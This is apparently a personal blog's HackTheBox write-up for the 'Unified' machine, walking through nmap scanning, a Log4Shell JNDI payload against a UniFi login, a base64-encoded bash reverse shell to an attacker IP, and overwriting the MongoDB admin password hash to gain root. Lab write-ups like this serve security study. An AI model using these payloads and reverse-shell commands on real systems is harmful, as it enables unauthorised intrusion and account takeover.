@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>Unified | Shang</title>
+
+    
+<link href="/favicon.png" rel="shortcut icon" type="image/x-icon" />
+
+
+
+
+<meta name="author" content="Shang" />
+<meta name="description" content="Completed on 04/09/2022 | OS: Linux
+Tools used: nmap, burp-suite, netcat, ssh
+Enumeration First, we will use the Nmap tool to scan the website for information such as ports, services, servers, and vulnerabilities on this server. # Nmap 7.92 scan initiated Sun Sep 4 11:35:47 2022 as: nmap -sV -sC -oN unified.txt 10.129.94.222 Nmap scan report for 10.129.94.222 Host is up (0.069s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8." />
+
+
+
+<meta name="generator" content="Hugo 0.111.3">
+
+<link rel="canonical" href="https://shanglyuv.github.io/posts/unified/" />
+
+
+<meta property="og:title" content="Unified" />
+<meta property="og:description" content="Completed on 04/09/2022 | OS: Linux
+Tools used: nmap, burp-suite, netcat, ssh
+Enumeration First, we will use the Nmap tool to scan the website for information such as ports, services, servers, and vulnerabilities on this server. # Nmap 7.92 scan initiated Sun Sep 4 11:35:47 2022 as: nmap -sV -sC -oN unified.txt 10.129.94.222 Nmap scan report for 10.129.94.222 Host is up (0.069s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shanglyuv.github.io/posts/unified/" /><meta property="og:image" content="https://shanglyuv.github.io/img/cover.jpg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-04-05T14:54:09+03:00" />
+<meta property="article:modified_time" content="2023-04-05T14:54:09+03:00" />
+
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://shanglyuv.github.io/img/cover.jpg"/>
+
+<meta name="twitter:title" content="Unified"/>
+<meta name="twitter:description" content="Completed on 04/09/2022 | OS: Linux
+Tools used: nmap, burp-suite, netcat, ssh
+Enumeration First, we will use the Nmap tool to scan the website for information such as ports, services, servers, and vulnerabilities on this server. # Nmap 7.92 scan initiated Sun Sep 4 11:35:47 2022 as: nmap -sV -sC -oN unified.txt 10.129.94.222 Nmap scan report for 10.129.94.222 Host is up (0.069s latency). Not shown: 996 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."/>
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.css" integrity="sha256-UXesixbeLkB/UYxVTzuj/gg3+LMzgwAmg3zD+C4ZASQ=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/icomoon.css" />
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/css/OverlayScrollbars.min.css" integrity="sha256-WKijf8KI68sbq8Znd6yMepIuFF0wdWfIt6gk3JWcQfk=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css">
+<link rel="stylesheet" href="/css/site.css" />
+
+<style>
+  .ui.header a:not(.item, .ui.button):hover {
+    text-decoration: underline;
+  }
+
+  
+  a:not(.item, .ui.button) {
+    color: seagreen !important;
+  }
+  
+
+  
+  .inverted a:not(.item, .ui.button) {
+     color: darkseagreen !important;
+  }
+  
+
+  
+  body.default {
+    
+    background-color: #f7f7f7;
+    
+
+    
+    background-image: url(/me/background.jpeg);
+    
+  }
+  
+
+  
+  body.dark {
+    
+    background-color: #333;
+    
+
+    
+    background-image: url(/me/background-darkmode.jpeg);
+    
+  }
+  
+</style>
+
+
+    
+
+
+
+<link rel="stylesheet" data-highlight href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/styles/gruvbox-light.min.css" />
+
+
+
+
+
+
+
+    
+  </head>
+
+  <body class="default">
+    
+<nav class="ui secondary menu dream-menu dream-nav">
+
+  
+  <a class="item dream-flip-toggle" title="Lật!">
+    <i class="large link bullseye icon"></i>
+  </a>
+  
+  <a class="item" href="https://shanglyuv.github.io" title="Home">
+    <i class="large link home icon"></i>
+  </a>
+  
+  <a class="item" onclick="themeSwitch(event)">
+    <i class="large link icon theme-switch"></i>
+  </a>
+  
+  
+  <a class="item" title="Search" onclick="toggleSearch(event)">
+    <i class="large link search icon"></i>
+  </a>
+  
+</nav>
+
+    <div class="flip-container">
+      <div class="flipper">
+        <section class="front">
+          <div class="dream-max-width">
+            
+<div class="ui relaxed centered grid dream-grid dream-grid-single">
+  
+  
+  
+  
+
+  
+  <aside class="sixteen wide mobile sixteen wide tablet three wide computer column dream-single-aside">
+    
+    <div class="ui segment toc">
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration"><strong>Enumeration</strong></a></li>
+    <li><a href="#exploitation">Exploitation</a>
+      <ul>
+        <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+
+    
+  </aside>
+  
+  <div class="sixteen wide mobile sixteen wide tablet ten wide computer column markdown-body dream-single" id="dream-save-post-as-img">
+    <section class="ui segment">
+      <header>
+        <h1 class="ui large header">Unified<span class="sub header">
+            <span class="left">
+              @
+              
+                
+                  Shang
+                
+              
+
+              | 
+                  
+                    Wednesday, Apr 5, 2023
+                  
+                
+
+              | 5 minutes read
+
+              
+              | Update at
+                
+                  
+                    Wednesday, Apr 5, 2023
+                  
+                
+              
+            </span>
+
+            
+            <span class="dream-share">
+  <a href="#" class="save-as-image" title="Save as image" onclick="savePostAsImg()">
+    <i class="save icon"></i>
+  </a>
+  <a href="https://twitter.com/intent/tweet?text=Unified&url=https%3a%2f%2fshanglyuv.github.io%2fposts%2funified%2f" title="Twitter">
+    <i class="twitter icon"></i>
+  </a>
+  <a href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fshanglyuv.github.io%2fposts%2funified%2f" title="Facebook">
+    <i class="facebook icon"></i>
+  </a>
+</span>
+
+            
+          </span>
+        </h1>
+      </header>
+
+      <article class="main">
+        
+        <img class="cover" src="/img/Unified/cover.png" />
+        
+
+        <blockquote>
+<p>Completed on <code>04/09/2022</code> | OS: <code>Linux</code></p>
+<p>Tools used: <code>nmap</code>, <code>burp-suite</code>, <code>netcat</code>, <code>ssh</code></p>
+</blockquote>
+<h2 id="enumeration"><strong>Enumeration</strong></h2>
+<ul>
+<li>First, we will use the Nmap tool to scan the website for information such as ports, services, servers, and vulnerabilities on this server.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.92 scan initiated Sun Sep  4 11:35:47 2022 as: nmap -sV -sC -oN unified.txt 10.129.94.222</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.129.94.222
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.069s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE         VERSION
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf🇩🇪ae <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 18💿9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>6789/tcp open  ibm-db2-admin?
+</span></span><span style="display:flex;"><span>8080/tcp open  http-proxy
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">404</span> 
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html;charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Language: en
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">431</span>
+</span></span><span style="display:flex;"><span>|     Date: Sun, <span style="color:#ae81ff">04</span> Sep <span style="color:#ae81ff">2022</span> 08:35:56 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!doctype html&gt;&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP Status <span style="color:#ae81ff">404</span> 
+</span></span><span style="display:flex;"><span>|     Found&lt;/title&gt;&lt;style type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;body <span style="color:#f92672">{</span>font-family:Tahoma,Arial,sans-serif;<span style="color:#f92672">}</span> h1, h2, h3, b <span style="color:#f92672">{</span>color:white;background-color:#525D76;<span style="color:#f92672">}</span> h1 <span style="color:#f92672">{</span>font-size:22px;<span style="color:#f92672">}</span> h2 <span style="color:#f92672">{</span>font-size:16px;<span style="color:#f92672">}</span> h3 <span style="color:#f92672">{</span>font-size:14px;<span style="color:#f92672">}</span> p <span style="color:#f92672">{</span>font-size:12px;<span style="color:#f92672">}</span> a <span style="color:#f92672">{</span>color:black;<span style="color:#f92672">}</span> .line <span style="color:#f92672">{</span>height:1px;background-color:#525D76;border:none;<span style="color:#f92672">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status <span style="color:#ae81ff">404</span> 
+</span></span><span style="display:flex;"><span>|     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span><span style="display:flex;"><span>|   GetRequest, HTTPOptions: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">302</span> 
+</span></span><span style="display:flex;"><span>|     Location: http://localhost:8080/manage
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>|     Date: Sun, <span style="color:#ae81ff">04</span> Sep <span style="color:#ae81ff">2022</span> 08:35:56 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|   RTSPRequest, Socks5: 
+</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> 
+</span></span><span style="display:flex;"><span>|     Content-Type: text/html;charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>|     Content-Language: en
+</span></span><span style="display:flex;"><span>|     Content-Length: <span style="color:#ae81ff">435</span>
+</span></span><span style="display:flex;"><span>|     Date: Sun, <span style="color:#ae81ff">04</span> Sep <span style="color:#ae81ff">2022</span> 08:35:56 GMT
+</span></span><span style="display:flex;"><span>|     Connection: close
+</span></span><span style="display:flex;"><span>|     &lt;!doctype html&gt;&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP Status <span style="color:#ae81ff">400</span> 
+</span></span><span style="display:flex;"><span>|     Request&lt;/title&gt;&lt;style type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/css&#34;</span>&gt;body <span style="color:#f92672">{</span>font-family:Tahoma,Arial,sans-serif;<span style="color:#f92672">}</span> h1, h2, h3, b <span style="color:#f92672">{</span>color:white;background-color:#525D76;<span style="color:#f92672">}</span> h1 <span style="color:#f92672">{</span>font-size:22px;<span style="color:#f92672">}</span> h2 <span style="color:#f92672">{</span>font-size:16px;<span style="color:#f92672">}</span> h3 <span style="color:#f92672">{</span>font-size:14px;<span style="color:#f92672">}</span> p <span style="color:#f92672">{</span>font-size:12px;<span style="color:#f92672">}</span> a <span style="color:#f92672">{</span>color:black;<span style="color:#f92672">}</span> .line <span style="color:#f92672">{</span>height:1px;background-color:#525D76;border:none;<span style="color:#f92672">}</span>&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status <span style="color:#ae81ff">400</span> 
+</span></span><span style="display:flex;"><span>|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to https://10.129.94.222:8443/manage
+</span></span><span style="display:flex;"><span>|_http-open-proxy: Proxy might be redirecting requests
+</span></span><span style="display:flex;"><span>8443/tcp open  ssl/nagios-nsca Nagios NSCA
+</span></span></code></pre></div><ul>
+<li>Here, we have 4 ports as below:</li>
+</ul>
+<blockquote>
+<p><code>22/tcp   open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</code></p>
+<p><code>6789/tcp open  ibm-db2-admin?</code>
+<code>8080/tcp open  http-proxy</code></p>
+<p><code>8443/tcp open  ssl/nagios-nsca Nagios NSCA</code></p>
+</blockquote>
+<p>The scan revealed an open port running an HTTP proxy. However, the proxy seems to redirect requests to port 8443, on which an SSL web server appears to be running. The website on port 8443 is &ldquo;UniFi Network&rdquo;.</p>
+<!-- raw HTML omitted -->
+<p><img src="/img/Unified/Untitled.png" alt="Untitled"></p>
+<p>We use the keyword “<code>UniFi 6.4.54 exploit</code>” reveals an article that discusses the in-depth exploitation of the <code>CVE-2021-44228</code> vulnerability within this application - ( It is also called Log4J).</p>
+<h2 id="exploitation">Exploitation</h2>
+<p>First, we try to login to the website with <code>admin:admin</code> and the login requests will be captured by Burp Suite, then we can edit it.</p>
+<p>The vulnerability is in the <code>remember</code> (or username in other version) value issued in the login request</p>
+<p>shown below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /api/login HTTP/2
+</span></span><span style="display:flex;"><span>Host: &lt;TARGET&gt; 
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">109</span>
+</span></span><span style="display:flex;"><span>Sec-Ch-Ua: <span style="color:#e6db74">&#34; Not A;Brand&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;99&#34;</span>, <span style="color:#e6db74">&#34;Chromium&#34;</span>;v<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;96&#34;</span>
+</span></span><span style="display:flex;"><span>Sec-Ch-Ua-Mobile: ?0
+</span></span><span style="display:flex;"><span>User-Agent: User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> Chrome/96.0.4664.45 Safari/537.36
+</span></span><span style="display:flex;"><span>Sec-Ch-Ua-Platform: <span style="color:#e6db74">&#34;macOS&#34;</span>
+</span></span><span style="display:flex;"><span>Content-Type: application/json; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Origin: https://&lt;TARGET&gt;
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site: same-origin
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode: cors
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest: empty
+</span></span><span style="display:flex;"><span>Referer: https://&lt;TARGET&gt;/manage/account/login?redirect<span style="color:#f92672">=</span>%2Fmanage
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;admin&#34;</span>,<span style="color:#e6db74">&#34;remember&#34;</span>:<span style="color:#e6db74">&#34;&lt;PAYLOAD&gt;&#34;</span>,<span style="color:#e6db74">&#34;strict&#34;</span>:true<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p><img src="/img/Unified/Screenshot_from_2022-09-04_15-55-20.png" alt="Screenshot from 2022-09-04 15-55-20.png"></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<ul>
+<li>Apter we touch “send” the Response pane will display the response from the request and the output shows us an error message the payload is actually being executed.</li>
+<li>If we use the tcpdump on port 389 tool in shell linux to see if network packets are being transmitted.</li>
+</ul>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_15-56-42.png" alt="Screenshot from 2022-09-04 15-56-42.png"></p>
+<ul>
+<li>Now that you know the target is vulnerable, we are going to try and get a reverse shell so we can interact with the underlying Linux operating system. First, you need to clone and build the tool, rogue-jndi from the GitHub repository linked below:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>git clone https://github.com/veracode-research/rogue-jndi
+</span></span></code></pre></div><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<ul>
+<li>Once the Jar is compiled, you’ll have to craft a command to deliver the reverse shell. We don’t have <code>nc</code> out of the box. Let’s craft our reverse shell and Base64 encode it using the one-liner below. Modify the command to fit your needs, replacing the IP address and port.</li>
+</ul>
+<p><code>echo 'bash -c bash -i &gt;&amp;/dev/tcp/10.10.15.15/4444 0&gt;&amp;1' | base64</code></p>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_15-57-14.png" alt="Screenshot from 2022-09-04 15-57-14.png"></p>
+<ul>
+<li>With that Base64 output, build your command in rogue-jndi:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>java -jar rogue-jndi/target/RogueJndi-1.1.jar --command <span style="color:#e6db74">&#34;bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTkyLjE2OC4xMS41MC80NDQ0IDA==}|{base64,-d}|{bash,-i}&#34;</span> --hostname <span style="color:#e6db74">&#34;192.168.11.50&#34;</span>
+</span></span></code></pre></div><ul>
+<li>Replace the Base64 encoded string after “echo” in the command above with the one you generated. Replace the hostname variable with the public or local IP of the host you will run the command from. Then start your rogue-jndi LDAP server up.</li>
+</ul>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_15-59-51.png" alt="Screenshot from 2022-09-04 15-59-51.png"></p>
+<ul>
+<li>Going back to our intercepted POST request, let&rsquo;s change the payload to
+<code>${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}</code>and click <code>Send</code></li>
+</ul>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_16-37-11.png" alt="Screenshot from 2022-09-04 16-37-11.png"></p>
+<ul>
+<li>Once we receive the output from Rogue server, a shell spawns on our Netcat listen and we can upgrade up the terminal shell as below:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>script /dev/null -c bash
+</span></span></code></pre></div><ul>
+<li>Finally, we get the user file contains flag:</li>
+</ul>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_16-39-10.png" alt="Screenshot from 2022-09-04 16-39-10.png"></p>
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>Now we will check if mongoDB is running the target systerm and use the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ps aux | grep mongo
+</span></span></code></pre></div><ul>
+<li>Then, we can see that mongo running port 27117, now we will connect to MongoDB and show databases.</li>
+</ul>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_16-40-53.png" alt="Screenshot from 2022-09-04 16-40-53.png"></p>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_16-44-09.png" alt="Screenshot from 2022-09-04 16-44-09.png"></p>
+<ul>
+<li>In order to view the admin’s table information, we use the following command:</li>
+</ul>
+<p><code>db.admin.find().forEach(printjson);</code></p>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_16-55-03.png" alt="Screenshot from 2022-09-04 16-55-03.png"></p>
+<ul>
+<li>Their password hash is located in the <code>X_Shadow</code> varialbe, but it can’t crack because this is SHA-512 code. Instead we can change the password hash with our very own created hash in order to replace the administrators password and authenticate to the administrative panel. To do this we can use the following command.</li>
+</ul>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_18-31-57.png" alt="Screenshot from 2022-09-04 18-31-57.png"></p>
+<blockquote>
+<p>SHA-512, or Secure Hash Algorithm 512, is a hashing algorithm used to convert text of any length into a fixed-size string. Each output produces a SHA-512 length of 512 bits (64 bytes). This algorithm is commonly used for email addresses hashing, password hashing…</p>
+</blockquote>
+<ul>
+<li>Let&rsquo;s proceed to replacing the existing hash with the one we created.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>db.admin.update<span style="color:#f92672">({</span><span style="color:#e6db74">&#34;_id&#34;</span>: ObjectId<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;61ce278f46e0fb0012d47ee4&#34;</span><span style="color:#f92672">)}</span>,<span style="color:#f92672">{</span>$set:<span style="color:#f92672">{</span><span style="color:#e6db74">&#34;x_shadow&#34;</span>:<span style="color:#e6db74">&#34;SHA_512 Hash Generated&#34;</span><span style="color:#f92672">}})</span>
+</span></span></code></pre></div><p><img src="/img/Unified/Screenshot_from_2022-09-04_23-10-25.png" alt="Screenshot from 2022-09-04 23-10-25.png"></p>
+<ul>
+<li>
+<p>Let&rsquo;s now visit the website and log in as administrator . It is very important to note that the username is case sensitive.</p>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_23-11-58.png" alt="Screenshot from 2022-09-04 23-11-58.png"></p>
+</li>
+<li>
+<p>UniFi offers a setting for SSH Authentication, which is a functionality that allows you to administer other Access Points over SSH from a console or terminal.</p>
+</li>
+</ul>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_23-13-38.png" alt="Screenshot from 2022-09-04 23-13-38.png"></p>
+<p>Finally, we get the password of root account. Let&rsquo;s attempt to authenticate to the system as root over SSH and the root file in the folder root.</p>
+<p><img src="/img/Unified/Screenshot_from_2022-09-04_23-14-46.png" alt="Screenshot from 2022-09-04 23-14-46.png"></p>
+<blockquote>
+<p>Done🎉</p>
+</blockquote>
+
+      </article>
+    </section>
+
+    
+
+    
+    <article class="ui segment utterances-comments" data-html2canvas-ignore>
+      <script
+        src="https://utteranc.es/client.js"
+        repo="shanglyu/shanglyu.github.io"
+        issue-term="og:title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+      </script>
+    </article>
+    
+
+    
+  </div>
+</div>
+
+
+            <footer class="ui basic center aligned segment" style="background-color: transparent;">
+              
+              <p>© 2023 Shang</p>
+              
+
+              <p>Powered by <a href="https://gohugo.io/" target="_blank">Hugo</a> with theme <a href="https://github.com/g1eny0ung/hugo-theme-dream" target="_blank">Dream</a>.</p>
+
+              
+            </footer>
+          </div>
+        </section>
+        <section class="back">
+          <div class="dream-max-width">
+            <header class="ui basic very padded segment dream-header">
+  
+  <div class="ui small circular image">
+    <img src="/me/avatar.jpg" alt="avatar" />
+  </div>
+  
+
+  <div class="content">
+    <h1 class="ui medium header">Shang<span class="sub header">CTFer-Pentester</span>
+    </h1>
+
+    <article class="ui horizontal list">
+      
+      <a class="item" href="/posts">
+        <i class="archive icon" title="Archives"></i>
+      </a>
+      
+      <a class="item" href="/categories">
+        <i class="th list icon" title="All Categories"></i>
+      </a>
+      <a class="item" href="/tags">
+        <i class="tags icon" title="All Tags"></i>
+      </a>
+    </article>
+
+    
+    
+    
+    
+    
+      
+    
+      
+    
+    
+
+    
+
+    
+    
+    
+          <div class="dream-tags">
+          
+          
+          
+            <a class="ui label" href="/tags/hackthebox/" title="HackTheBox">
+              HackTheBox
+            </a>
+          
+          
+          
+            <a class="ui label" href="/tags/pentester/" title="Pentester">
+              Pentester
+            </a>
+          
+          </div>
+    
+
+    
+  </div>
+</header>
+
+
+<div class="ui relaxed grid dream-grid dream-back">
+  
+  
+  
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment markdown-body">
+      <div class="ui medium header">Me</div>
+      <h3 id="-some-infomations-about-me">💁‍♂️ Some infomations about me:</h3>
+<ul>
+<li>🌁 I’m currently studying in National Research University Moscow Power Engineering Institute (MPEI)</li>
+<li>📱I’m currently a member of the CTF SeaHatVN and Unicron team of National Research University Moscow Power Engineering Institute (MPEI)</li>
+<li>🌱 I’m currently learning: PHP(Laravel), Java, JS(Nodejs), Python, C#, Golang and Pentest Web</li>
+<li>⚡ What I like to do: I like so much music, football, chess&hellip;coding and CTF</li>
+</ul>
+
+    </article>
+  </div>
+  
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment markdown-body">
+      <div class="ui medium header">Open Source</div>
+      
+    </article>
+  </div>
+  
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    <article class="ui segment markdown-body">
+      <div class="ui medium header">Others</div>
+      
+    </article>
+  </div>
+  
+
+  
+    <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+      <article class="ui segment">
+        <div class="ui medium header">Social Links</div>
+        <nav class="ui secondary menu dream-menu dream-socials">
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <a class="item" href="https://github.com/shanglyu" target="_blank">
+    <i class="large github icon" title="GitHub"></i>
+  </a>
+  
+
+  
+
+  
+
+  
+</nav>
+
+      </article>
+    </div>
+  
+
+  <div class="sixteen wide mobile eight wide tablet four wide computer column dream-column">
+    
+  </div>
+
+  
+</div>
+
+          </div>
+        </section>
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/semantic-ui@2.4.2/dist/semantic.min.js" integrity="sha256-CgSoWC9w5wNmI1aN8dIMK+6DPelUEtvDr+Bc2m/0Nx8=" crossorigin="anonymous"></script>
+
+    
+    <div class="ui segment" id="dream-search">
+  <div class="ui search">
+    <div class="ui transparent input">
+      <input class="prompt" type="text" placeholder="Search" />
+    </div>
+    <div class="results"></div>
+  </div>
+</div>
+<script>
+  $(document).ready(function () {
+    $.getJSON('https:\/\/shanglyuv.github.io/index.json', function (data) {
+      $('.ui.search').search({
+        source: data,
+        searchFields: ['title'],
+        showNoResults: false,
+      })
+    })
+  })
+</script>
+<script src="/js/search.js"></script>
+
+    
+
+    
+
+    <script>
+  window.background = "#f7f7f7"
+  window.defaultDark =  null 
+  window.backgroundDark = "#333"
+  window.backgroundImageDark = "/me/background-darkmode.jpeg"
+  window.darkNav =  true 
+  window.maxTags =  null 
+  window.hasTwitterEmbed =  null 
+  window.fixedNav =  true 
+
+  if (window.hasTwitterEmbed) {
+    
+    window.twttr = (function (d, s, id) {
+      var js,
+        fjs = d.getElementsByTagName(s)[0],
+        t = window.twttr || {}
+      if (d.getElementById(id)) return t
+      js = d.createElement(s)
+      js.id = id
+      js.src = 'https://platform.twitter.com/widgets.js'
+      fjs.parentNode.insertBefore(js, fjs)
+
+      t._e = []
+      t.ready = function (f) {
+        t._e.push(f)
+      }
+
+      return t
+    })(document, 'script', 'twitter-wjs')
+  }
+</script>
+<script src="https://cdn.jsdelivr.net/npm/overlayscrollbars@1.13.1/js/jquery.overlayScrollbars.min.js" integrity="sha256-tBd38uWlvgfps3zHPrUb2ePBg+Z8EjMf0QloFONzpvU=" crossorigin="anonymous"></script>
+<script src="/js/header.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/theme.js"></script>
+
+    
+
+
+
+<script src="/js/scrollToTop.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js"></script>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/ocaml.min.js"></script>
+
+
+
+<script>
+  hljs.highlightAll()
+  setHighlightTheme()
+
+  function setHighlightTheme() {
+    var isDark = localStore.getItem('hugo-theme-dream-is-dark')
+    isDark = isDark ? isDark : window.defaultDark ? 'y' : isDark
+
